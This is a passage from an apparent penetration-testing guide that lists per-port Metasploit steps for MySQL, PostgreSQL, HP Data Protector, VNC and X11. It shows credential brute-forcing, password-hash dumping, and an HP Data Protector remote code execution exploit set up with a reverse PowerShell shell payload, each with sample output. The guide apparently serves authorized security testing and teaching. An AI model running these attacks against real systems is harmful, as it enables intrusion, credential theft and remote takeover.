<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span><span class="p">,</span> <span class="n">but</span> <span class="n">responds</span> <span class="k">with</span> <span class="n">an</span> <span class="n">error</span><span class="p">:</span> \<span class="n">x04Host</span> <span class="s1">&#39;10.10.3.71&#39;</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">allowed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">this</span> <span class="n">MySQL</span> <span class="n">server</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span> <span class="mf">5.0</span><span class="o">.</span><span class="mi">22</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">10</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span><span class="p">,</span> <span class="n">but</span> <span class="n">responds</span> <span class="k">with</span> <span class="n">an</span> <span class="n">error</span><span class="p">:</span> \<span class="n">x04Host</span> <span class="s1">&#39;10.10.3.71&#39;</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">allowed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">this</span> <span class="n">MySQL</span> <span class="n">server</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span> <span class="mf">5.1</span><span class="o">.</span><span class="mi">52</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">10</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">18</span> <span class="n">of</span> <span class="mi">44</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">40</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span> <span class="mf">3.23</span><span class="o">.</span><span class="mi">41</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">10</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span> <span class="mf">3.23</span><span class="o">.</span><span class="mi">41</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">10</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span> <span class="mf">5.6</span><span class="o">.</span><span class="mi">17</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">10</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span> <span class="mf">5.1</span><span class="o">.</span><span class="mi">50</span><span class="o">-</span><span class="n">community</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">10</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="section" id="mysql-login-utility">
<h4>MySQL Login Utility<a class="headerlink" href="#mysql-login-utility" title="Permalink to this headline">¶</a></h4>
<p>Validate login or bruteforce logins. This module simply queries the MySQL instance for a specific user/pass (default is root with blank)</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">mysql_login</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">3306</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
<span class="nb">set</span> <span class="n">username</span> <span class="n">root</span>
<span class="nb">set</span> <span class="n">password</span> <span class="n">example</span><span class="nd">@123</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="n">MYSQL</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">remote</span> <span class="n">MySQL</span> <span class="n">version</span> <span class="mf">5.1</span><span class="o">.</span><span class="mi">50</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="n">MYSQL</span> <span class="o">-</span> <span class="n">Success</span><span class="p">:</span> <span class="s1">&#39;root:example@123&#39;</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">22</span> <span class="n">of</span> <span class="mi">44</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">50</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="n">MYSQL</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">remote</span> <span class="n">MySQL</span> <span class="n">version</span> <span class="mf">5.1</span><span class="o">.</span><span class="mi">50</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="n">MYSQL</span> <span class="o">-</span> <span class="n">Success</span><span class="p">:</span> <span class="s1">&#39;root:example@123&#39;</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="n">MYSQL</span> <span class="o">-</span> <span class="n">Unsupported</span> <span class="n">target</span> <span class="n">version</span> <span class="n">of</span> <span class="n">MySQL</span> <span class="n">detected</span><span class="o">.</span> <span class="n">Skipping</span><span class="o">.</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="n">MYSQL</span> <span class="o">-</span> <span class="n">Unsupported</span> <span class="n">target</span> <span class="n">version</span> <span class="n">of</span> <span class="n">MySQL</span> <span class="n">detected</span><span class="o">.</span> <span class="n">Skipping</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="n">MYSQL</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">remote</span> <span class="n">MySQL</span> <span class="n">version</span> <span class="mf">5.6</span><span class="o">.</span><span class="mi">15</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="n">MYSQL</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">FAILED</span><span class="p">:</span> <span class="n">root</span><span class="p">:</span><span class="n">example</span><span class="nd">@123</span> <span class="p">(</span><span class="n">Incorrect</span><span class="p">:</span>
</pre></div>
</div>
<p>Once we have to username passsword for the root we can use</p>
</div>
<div class="section" id="mysql-password-hashdump">
<h4>MYSQL Password Hashdump<a class="headerlink" href="#mysql-password-hashdump" title="Permalink to this headline">¶</a></h4>
<p>to extract the usernames and encrypted password hashes from a MySQL server.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">mysql_hashdump</span>
<span class="n">creds</span> <span class="o">-</span><span class="n">p</span> <span class="mi">3306</span> <span class="o">-</span><span class="n">t</span> <span class="n">password</span> <span class="o">-</span><span class="n">u</span> <span class="n">root</span> <span class="o">-</span><span class="n">R</span>
<span class="nb">set</span> <span class="n">username</span> <span class="n">root</span>
<span class="nb">set</span> <span class="n">password</span> <span class="n">example</span><span class="nd">@123</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">MySQL</span> <span class="n">Error</span><span class="p">:</span> <span class="n">RbMysql</span><span class="p">::</span><span class="n">HandshakeError</span> <span class="n">Bad</span> <span class="n">handshake</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">There</span> <span class="n">was</span> <span class="n">an</span> <span class="n">error</span> <span class="n">reading</span> <span class="n">the</span> <span class="n">MySQL</span> <span class="n">User</span> <span class="n">Table</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">4</span> <span class="n">of</span> <span class="mi">6</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">66</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">HashString</span> <span class="k">as</span> <span class="n">Loot</span><span class="p">:</span> <span class="n">root</span><span class="p">:</span><span class="mi">6</span><span class="n">FE073B02F77230C092415032F0FF0951FXXXXXX</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">HashString</span> <span class="k">as</span> <span class="n">Loot</span><span class="p">:</span> <span class="n">wordpress</span><span class="p">:</span><span class="n">A31B8F449706C32558ABC788DDABF62DCCXXXXXX</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">HashString</span> <span class="k">as</span> <span class="n">Loot</span><span class="p">:</span> <span class="n">root</span><span class="p">:</span><span class="mi">6</span><span class="n">FE073B02F77230C092415032F0FF0951FXXXXXX</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">5</span> <span class="n">of</span> <span class="mi">6</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">83</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">HashString</span> <span class="k">as</span> <span class="n">Loot</span><span class="p">:</span> <span class="n">newsgroupdbo</span><span class="p">:</span><span class="mi">6</span><span class="n">FE073B02F77230C092415032F0FF0951FXXXXXX</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">HashString</span> <span class="k">as</span> <span class="n">Loot</span><span class="p">:</span> <span class="n">intiadda</span><span class="p">:</span><span class="mi">6</span><span class="n">FE073B02F77230C092415032F0FF0951XXXXXX</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">HashString</span> <span class="k">as</span> <span class="n">Loot</span><span class="p">:</span> <span class="n">newsgroupdbo</span><span class="p">:</span><span class="mi">6</span><span class="n">FE073B02F77230C092415032F0FF0951FXXXXXX</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id51">
<h3>Other<a class="headerlink" href="#id51" title="Permalink to this headline">¶</a></h3>
<div class="section" id="mysql">
<h4>mysql<a class="headerlink" href="#mysql" title="Permalink to this headline">¶</a></h4>
<p>Once we have the username and password, we can use <strong>mysql utility</strong> to login in to the server.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">mysql</span> <span class="o">-</span><span class="n">u</span> <span class="n">root</span> <span class="o">-</span><span class="n">p</span> <span class="o">-</span><span class="n">h</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
</pre></div>
</div>
<div class="admonition-todo admonition" id="index-1">
<p class="first admonition-title">Todo</p>
<p class="last">Explore UDF functionality and vulnerablity!!</p>
</div>
</div>
</div>
</div>
<div class="section" id="postgresql-port-5432">
<h2>Postgresql - Port 5432<a class="headerlink" href="#postgresql-port-5432" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id52">
<h3>Metasploit<a class="headerlink" href="#id52" title="Permalink to this headline">¶</a></h3>
<div class="section" id="postgresql-version-probe">
<h4>PostgreSQL Version Probe<a class="headerlink" href="#postgresql-version-probe" title="Permalink to this headline">¶</a></h4>
<p>Enumerates the verion of PostgreSQL servers.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">postgres</span><span class="o">/</span><span class="n">postgres_version</span>
</pre></div>
</div>
</div>
<div class="section" id="postgresql-login-utility">
<h4>PostgreSQL Login Utility<a class="headerlink" href="#postgresql-login-utility" title="Permalink to this headline">¶</a></h4>
<p>Module attempts to authenticate against a PostgreSQL instance using username and password combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">postgres</span><span class="o">/</span><span class="n">postgres_login</span>
</pre></div>
</div>
</div>
<div class="section" id="postgresql-database-name-command-line-flag-injection">
<h4>PostgreSQL Database Name Command Line Flag Injection<a class="headerlink" href="#postgresql-database-name-command-line-flag-injection" title="Permalink to this headline">¶</a></h4>
<p>Identify PostgreSQL 9.0, 9.1, and 9.2 servers that are vulnerable to command-line flag injection through CVE-2013-1899. This can lead to denial of service, privilege escalation, or even arbitrary code execution</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">postgres</span><span class="o">/</span><span class="n">postgres_dbname_flag_injection</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="port-5555-hpdataprotector-rce">
<h2>Port: 5555 HPDataProtector RCE<a class="headerlink" href="#port-5555-hpdataprotector-rce" title="Permalink to this headline">¶</a></h2>
<p>HPData proctector service was running on port no. 5555.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">5555</span>

<span class="n">Services</span>
<span class="o">========</span>
<span class="n">host</span>          <span class="n">port</span>  <span class="n">proto</span>  <span class="n">name</span>      <span class="n">state</span>  <span class="n">info</span>
<span class="o">----</span>          <span class="o">----</span>  <span class="o">-----</span>  <span class="o">----</span>      <span class="o">-----</span>  <span class="o">----</span>
<span class="mf">10.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span>      <span class="mi">5555</span>  <span class="n">tcp</span>    <span class="n">omniback</span>  <span class="nb">open</span>   <span class="n">HP</span> <span class="n">OpenView</span> <span class="n">Omniback</span><span class="o">/</span><span class="n">Data</span> <span class="n">Protector</span>
<span class="mf">10.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span>      <span class="mi">5555</span>  <span class="n">tcp</span>    <span class="n">omniinet</span>  <span class="nb">open</span>   <span class="n">HP</span> <span class="n">Data</span> <span class="n">Protector</span> <span class="mf">7.00</span> <span class="n">build</span> <span class="mi">105</span>
<span class="mf">10.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span>      <span class="mi">5555</span>  <span class="n">tcp</span>    <span class="n">freeciv</span>   <span class="nb">open</span>
<span class="mf">10.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span>      <span class="mi">5555</span>  <span class="n">tcp</span>    <span class="n">omniinet</span>  <span class="nb">open</span>   <span class="n">HP</span> <span class="n">Data</span> <span class="n">Protector</span> <span class="mf">7.00</span> <span class="n">build</span> <span class="mi">105</span>
<span class="mf">10.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span>      <span class="mi">5555</span>  <span class="n">tcp</span>    <span class="n">omniback</span>  <span class="nb">open</span>   <span class="n">HP</span> <span class="n">Data</span> <span class="n">Protector</span> <span class="n">A</span><span class="o">.</span><span class="mf">07.00</span> <span class="n">internal</span> <span class="n">build</span> <span class="mi">105</span><span class="p">;</span> <span class="n">built</span> <span class="n">on</span> <span class="n">Wednesday</span><span class="p">,</span> <span class="n">October</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">2013</span><span class="p">,</span> <span class="mi">10</span><span class="p">:</span><span class="mi">55</span> <span class="n">PM</span>
</pre></div>
</div>
<p>Metasploit framework comes with an exploit for  exploiting this vulnerability. which can be searched by</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">search</span> <span class="n">integutil</span>

<span class="n">Matching</span> <span class="n">Modules</span>
<span class="o">================</span>

 <span class="n">Name</span>                                                 <span class="n">Disclosure</span> <span class="n">Date</span>  <span class="n">Rank</span>   <span class="n">Description</span>
 <span class="o">----</span>                                                 <span class="o">---------------</span>  <span class="o">----</span>   <span class="o">-----------</span>
 <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="n">hp_data_protector_exec_integutil</span>  <span class="mi">2014</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">02</span>       <span class="n">great</span>  <span class="n">HP</span> <span class="n">Data</span> <span class="n">Protector</span> <span class="n">EXEC_INTEGUTIL</span> <span class="n">Remote</span> <span class="n">Code</span> <span class="n">ExecutionNOw</span>
</pre></div>
</div>
<p>Now this can be used by</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="n">hp_data_protector_exec_integutil</span>
<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">hp_data_protector_exec_integutil</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span>

<span class="n">Module</span> <span class="n">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="n">hp_data_protector_exec_integutil</span><span class="p">):</span>

<span class="n">Name</span>   <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
<span class="o">----</span>   <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
<span class="n">RHOST</span>                   <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">address</span>
<span class="n">RPORT</span>  <span class="mi">5555</span>             <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">port</span> <span class="p">(</span><span class="n">TCP</span><span class="p">)</span>

<span class="n">Exploit</span> <span class="n">target</span><span class="p">:</span>
<span class="n">Id</span>  <span class="n">Name</span>
<span class="o">--</span>  <span class="o">----</span>
<span class="mi">0</span>   <span class="n">Automatic</span>
</pre></div>
</div>
<p>Select the appropriate target by using</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">hp_data_protector_exec_integutil</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">targets</span>

<span class="n">Exploit</span> <span class="n">targets</span><span class="p">:</span>

<span class="n">Id</span>  <span class="n">Name</span>
<span class="o">--</span>  <span class="o">----</span>
<span class="mi">0</span>   <span class="n">Automatic</span>
<span class="mi">1</span>   <span class="n">Linux</span> <span class="mi">64</span> <span class="n">bits</span> <span class="o">/</span> <span class="n">HP</span> <span class="n">Data</span> <span class="n">Protector</span> <span class="mi">9</span>
<span class="mi">2</span>   <span class="n">Windows</span> <span class="mi">64</span> <span class="n">bits</span> <span class="o">/</span> <span class="n">HP</span> <span class="n">Data</span> <span class="n">Protector</span> <span class="mi">9</span>

<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">hp_data_protector_exec_integutil</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">target</span> <span class="mi">2</span>    <span class="o">-</span> <span class="k">for</span> <span class="n">windows</span> <span class="n">environment</span><span class="o">.</span>
</pre></div>
</div>
<p>set the appropriate RHOST and payloads by</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">hp_data_protector_exec_integutil</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">RHOST</span> <span class="mf">10.1</span><span class="o">.</span><span class="mf">1.1</span>
<span class="n">RHOST</span> <span class="o">=&gt;</span> <span class="mf">10.1</span><span class="o">.</span><span class="mf">1.1</span>
<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">hp_data_protector_exec_integutil</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">payloads</span>

<span class="n">Compatible</span> <span class="n">Payloads</span>
<span class="o">===================</span>

<span class="n">Name</span>                            <span class="n">Disclosure</span> <span class="n">Date</span>  <span class="n">Rank</span>    <span class="n">Description</span>
<span class="o">----</span>                            <span class="o">---------------</span>  <span class="o">----</span>    <span class="o">-----------</span>
<span class="n">cmd</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">reverse_powershell</span>                   <span class="n">normal</span>  <span class="n">Windows</span> <span class="n">Command</span> <span class="n">Shell</span><span class="p">,</span> <span class="n">Reverse</span> <span class="n">TCP</span> <span class="p">(</span><span class="n">via</span> <span class="n">Powershell</span><span class="p">)</span>
</pre></div>
</div>
<p>set all the necessary options and run. After this we can use Empire stagerlauncher or web_delivery to a get a meterpreter shell on our attacking machine.</p>
</div>
<div class="section" id="vnc-port-5900">
<h2>VNC - Port 5900<a class="headerlink" href="#vnc-port-5900" title="Permalink to this headline">¶</a></h2>
<p>We always find openVNCs in an engagement.</p>
<div class="section" id="id53">
<h3>Metasploit<a class="headerlink" href="#id53" title="Permalink to this headline">¶</a></h3>
<div class="section" id="vnc-authentication-none-detection">
<h4>VNC Authentication None Detection<a class="headerlink" href="#vnc-authentication-none-detection" title="Permalink to this headline">¶</a></h4>
<p>Detect VNC servers that support the &#8220;None&#8221; authentication method.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">vnc</span><span class="o">/</span><span class="n">vnc_none_auth</span>
</pre></div>
</div>
</div>
<div class="section" id="vnc-authentication-scanner">
<h4>VNC Authentication Scanner<a class="headerlink" href="#vnc-authentication-scanner" title="Permalink to this headline">¶</a></h4>
<p>Module will test a VNC server on a range of machines and report successful logins. Currently it supports RFB protocol version 3.3, 3.7, 3.8 and 4.001 using the VNC challenge response authentication method.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">vnc</span><span class="o">/</span><span class="n">vnc_login</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="x11-port-6000">
<h2>X11 - Port 6000<a class="headerlink" href="#x11-port-6000" title="Permalink to this headline">¶</a></h2>
<p>We do also find a lot of open X11 servers, we can use x11 to find the keyboard strokes and screenshots.</p>
<div class="section" id="id54">
<h3>Metasploit<a class="headerlink" href="#id54" title="Permalink to this headline">¶</a></h3>
<div class="section" id="x11-no-auth-scanner">
<h4>X11 No-Auth Scanner<a class="headerlink" href="#x11-no-auth-scanner" title="Permalink to this headline">¶</a></h4>
<p>Module scans for X11 servers that allow anyone to connect without authentication.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">x11</span><span class="o">/</span><span class="n">open_x11</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">6000</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample output</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.9</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">Access</span> <span class="n">Denied</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.9</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">Open</span> <span class="n">X</span> <span class="n">Server</span> <span class="p">(</span><span class="n">The</span> <span class="n">XFree86</span> <span class="n">Project</span><span class="p">,</span> <span class="n">Inc</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span>  <span class="mi">5</span> <span class="n">of</span> <span class="mi">45</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">11</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">No</span> <span class="n">response</span> <span class="n">received</span> <span class="n">due</span> <span class="n">to</span> <span class="n">a</span> <span class="n">timeout</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">Access</span> <span class="n">Denied</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span>  <span class="mi">9</span> <span class="n">of</span> <span class="mi">45</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">20</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">Access</span> <span class="n">Denied</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">14</span> <span class="n">of</span> <span class="mi">45</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">31</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.15</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">Access</span> <span class="n">Denied</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">18</span> <span class="n">of</span> <span class="mi">45</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">40</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.19</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">Access</span> <span class="n">Denied</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">23</span> <span class="n">of</span> <span class="mi">45</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">51</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">27</span> <span class="n">of</span> <span class="mi">45</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">60</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">32</span> <span class="n">of</span> <span class="mi">45</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">71</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.20</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">Open</span> <span class="n">X</span> <span class="n">Server</span> <span class="p">(</span><span class="n">Xfree86</span><span class="o">-</span><span class="n">Heidenhain</span><span class="o">-</span><span class="n">Project</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="section" id="x11-keyboard-command-injection">
<h4>X11 Keyboard Command Injection<a class="headerlink" href="#x11-keyboard-command-injection" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">x11</span><span class="o">/</span><span class="n">x11_keyboard_exec</span>
</pre></div>
</div>
